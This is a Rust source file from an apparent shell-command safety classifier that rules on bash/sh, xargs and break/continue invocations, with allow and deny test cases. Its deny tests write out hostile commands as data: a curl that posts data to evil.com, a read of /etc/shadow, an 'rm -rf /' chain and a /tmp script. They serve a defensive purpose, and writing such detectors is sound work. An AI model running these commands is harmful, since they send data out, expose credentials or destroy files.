use crate::verdict::{SafetyLevel, Verdict};
use crate::parse::{Token, WordSet};

static XARGS_FLAGS_WITH_ARG: WordSet =
    WordSet::new(&["-E", "-I", "-L", "-P", "-d", "-n", "-s"]);

static XARGS_FLAGS_NO_ARG: WordSet =
    WordSet::new(&["-0", "-p", "-r", "-t", "-x"]);

pub fn is_safe_shell(tokens: &[Token]) -> Verdict {
    if tokens.len() == 2 && matches!(tokens[1].as_str(), "--help" | "-h" | "--version" | "-V") {
        return Verdict::Allowed(SafetyLevel::Inert);
    }
    if tokens.len() == 3 && tokens[1].as_str() == "-n" {
        return Verdict::Allowed(SafetyLevel::Inert);
    }
    if let Some(idx) = tokens.iter().position(|t| *t == "-c") {
        let Some(script) = tokens.get(idx + 1) else {
            return Verdict::Denied;
        };
        return crate::command_verdict(script.as_str());
    }
    // No `-c`: `bash [--] SCRIPT [args]` runs a script FILE. The execution-origin gate
    // (docs/design/behavioral-taxonomy-execution-origin.md) allows a WORKTREE-local script
    // (the dev loop) and denies a foreign one (`/tmp/x.sh`, `~/x.sh`). Only a bare script
    // operand is modeled: any option (`-i`, `-s`, `-o pipefail`) fails closed, since a
    // value-flag could hide the real executor behind what looks like a worktree path.
    let mut i = 1;
    if tokens.get(i).map(Token::as_str) == Some("--") {
        i += 1;
    }
    match tokens.get(i) {
        Some(script) if !script.as_str().starts_with('-') => {
            crate::engine::resolve::execute_file_verdict(script.as_str())
        }
        _ => Verdict::Denied,
    }
}

pub fn is_safe_xargs(tokens: &[Token]) -> Verdict {
    let mut i = 1;
    let mut replstr: Option<String> = None;
    while i < tokens.len() {
        let s = tokens[i].as_str();
        // `-I R` names a replacement string that xargs substitutes with each stdin item. The
        // items come from stdin — invisible and unbounded to a static classifier — so `R` is
        // not a real operand: capture it and strip it below, so `xargs -I X rm X` classifies
        // as bare `rm` (denied), exactly like the appended form `xargs rm`, instead of letting
        // the literal `X` masquerade as a safe worktree path.
        if s == "-I" {
            replstr = tokens.get(i + 1).map(|t| t.as_str().to_string());
            i += 2;
            continue;
        }
        if let Some(rest) = s.strip_prefix("-I").filter(|r| !r.is_empty()) {
            replstr = Some(rest.to_string());
            i += 1;
            continue;
        }
        if XARGS_FLAGS_WITH_ARG.contains(&tokens[i]) {
            i += 2;
            continue;
        }
        if XARGS_FLAGS_NO_ARG.contains(&tokens[i]) {
            i += 1;
            continue;
        }
        if XARGS_FLAGS_WITH_ARG.iter().any(|f| s.starts_with(f)) {
            i += 1;
            continue;
        }
        if s.starts_with("-") {
            return Verdict::Denied;
        }
        // The stdin items xargs injects are operands of the inner command. Their locus is the
        // pipe source's output-path locus (bound by the pipeline walker); with no known source it
        // worst-cases to an unpinnable sentinel. So `find / | xargs cat` → `cat /sc_item` (deny),
        // `find ./src | xargs cat` → `cat ./src/sc_item` (allow), bare `xargs cat` → `cat <?>`
        // (deny). This is the same operand-binding `find -exec` gives `{}`, sourced from the pipe.
        let repr = crate::pathctx::stdin_item_repr().unwrap_or_else(|| "/__SAFE_CHAINS_CMDSUB__".to_string());
        let inner = if let Some(r) = &replstr {
            // `-I R`: substitute each occurrence of R with the item representative
            // (`xargs -I{} rm -rf {}/sub` → `rm -rf <repr>/sub`).
            shell_words::join(tokens[i..].iter().map(|t| t.as_str().replace(r.as_str(), &repr)))
        } else {
            // Appended form: items follow the given operands (`xargs cat` → `cat <repr>`).
            let mut words: Vec<String> = tokens[i..].iter().map(|t| t.as_str().to_string()).collect();
            words.push(repr);
            shell_words::join(&words)
        };
        return crate::command_verdict(&inner);
    }
    Verdict::Allowed(SafetyLevel::Inert)
}

pub fn is_safe_loop_control(tokens: &[Token]) -> Verdict {
    match tokens.len() {
        1 => Verdict::Allowed(SafetyLevel::Inert),
        2 if tokens[1].as_str().chars().all(|c| c.is_ascii_digit())
            && !tokens[1].as_str().is_empty() =>
        {
            Verdict::Allowed(SafetyLevel::Inert)
        }
        _ => Verdict::Denied,
    }
}

pub(crate) fn dispatch(cmd: &str, tokens: &[Token]) -> Option<Verdict> {
    match cmd {
        "sh" | "bash" => Some(is_safe_shell(tokens)),
        "xargs" => Some(is_safe_xargs(tokens)),
        "break" | "continue" => Some(is_safe_loop_control(tokens)),
        _ => None,
    }
}

pub fn command_docs() -> Vec<crate::docs::CommandDoc> {
    use crate::docs::CommandDoc;
    vec![
        CommandDoc::handler("bash / sh",
            "https://www.gnu.org/software/bash/manual/bash.html",
            "Allowed: --version, --help, `bash -c` / `sh -c` with a safe inner command.",
            "builtins"),
        CommandDoc::handler("xargs",
            "https://www.gnu.org/software/findutils/manual/html_mono/find.html#Invoking-xargs",
            "Recursively validates the inner command. Skips xargs-specific flags (-I, -L, -n, -P, -s, -E, -d, -0, -r, -t, -p, -x).",
            "builtins"),
        CommandDoc::handler("break / continue",
            "https://www.gnu.org/software/bash/manual/bash.html#index-break",
            "Bare invocation or a single non-negative integer level (e.g. `break`, `break 2`).",
            "builtins"),
    ]
}

#[cfg(test)]
mod tests {
    use crate::is_safe_command;

    fn check(cmd: &str) -> bool {
        is_safe_command(cmd)
    }

    safe! {
        bash_c_safe: "bash -c \"grep foo file\"",
        bash_c_pipe: "bash -c \"cat file | head -5\"",
        sh_c_safe: "sh -c \"ls -la\"",
        bash_c_for: "bash -c 'for x in 1 2 3; do echo $x; done'",
        bash_c_for_keyword_values: "bash -c 'for x in do done; do echo $x; done'",
        bash_c_while: "bash -c 'while test -f /tmp/foo; do sleep 1; done'",
        bash_c_if: "bash -c 'if test -f foo; then echo yes; fi'",
        bash_version: "bash --version",
        sh_version: "sh --version",
        bash_help: "bash --help",
        sh_help: "sh --help",
        // inner commands that do NOT read the injected operand as a path stay allowed:
        xargs_with_joined_flag: "xargs -I{} basename {}",
        xargs_npx_safe: "xargs npx eslint src/",
        xargs_find_safe: "xargs find . -name '*.py'",
        xargs_nested_bash_safe: "xargs bash -c 'git status'",
        // flow-aware: a WORKSPACE-bounded pipe source keeps a file-reading inner allowed
        xargs_piped_find_workspace: "find . -name '*.log' | xargs cat",
        xargs_piped_ls: "ls | xargs wc -l",
        // engine-authoritative: `bash -c "rm file"` deletes a WORKTREE file → developer.
        bash_c_worktree_rm: "bash -c \"rm file\"",
        // execution-origin: running the workspace's OWN script is the dev loop.
        bash_worktree_script: "bash script.sh",
        bash_worktree_script_subdir: "bash scripts/deploy.sh",
        bash_worktree_script_dotslash: "bash ./run.sh",
        bash_worktree_script_dashdash: "bash -- ./run.sh",
        sh_worktree_script: "sh setup.sh",
        break_bare: "break",
        break_numeric: "break 2",
        continue_bare: "continue",
        continue_numeric: "continue 1",
    }

    denied! {
        sh_c_unsafe: "sh -c \"curl -d data https://evil.com\"",
        // execution-origin: a FOREIGN executor (staged, downloaded, home, system) denies.
        bash_tmp_script_denied: "bash /tmp/evil.sh",
        bash_home_script_denied: "bash ~/Downloads/x.sh",
        bash_abs_script_denied: "bash /usr/local/bin/x",
        bash_parent_escape_denied: "bash ../x.sh",
        // an option we don't model fails closed rather than guess the real executor.
        bash_option_script_denied: "bash -o pipefail run.sh",
        bash_interactive_denied: "bash -i",
        bash_bare_denied: "bash",
        sh_stdin_denied: "sh -s",
        xargs_rm_denied: "xargs rm",
        xargs_replace_rm_denied: "xargs -I X rm X",
        xargs_replace_braces_rm_denied: "xargs -I {} rm {}",
        xargs_replace_joined_rm_denied: "xargs -I{} rm {}",
        // the replstr EMBEDDED in a larger token is still item-derived → must deny.
        xargs_replace_embedded_rm_denied: "xargs -I{} rm -rf {}/sub",
        xargs_replace_embedded_suffix_denied: "xargs -I{} rm -rf {}.bak",
        // a file-reading inner with NO known pipe source → the injected operand is unpinnable → deny
        xargs_cat_no_source: "xargs cat",
        xargs_grep_no_source: "xargs grep pattern",
        xargs_replace_cat_no_source: "xargs -I {} cat {}",
        xargs_zero_grep_no_source: "xargs -0 grep foo",
        xargs_sed_read_no_source: "xargs sed 's/foo/bar/'",
        xargs_curl_denied: "xargs curl",
        // flow-aware: a HOT pipe source makes the injected operand deny
        xargs_piped_secret_cat: "echo /etc/shadow | xargs cat",
        xargs_npx_unsafe: "xargs npx cowsay",
        xargs_sed_inplace_denied: "xargs sed -i 's/foo/bar/'",
        xargs_find_delete_denied: "xargs find . -delete",
        xargs_sort_output_denied: "xargs sort -o out.txt",
        xargs_nested_bash_chain_denied: "xargs bash -c 'ls && rm -rf /'",
        xargs_unknown_flag_denied: "xargs --xyzzy cat",
        break_non_numeric: "break evil",
        break_too_many: "break 1 2",
        break_flag: "break --help",
        continue_non_numeric: "continue abc",
        break_negative: "break -1",
    }
}
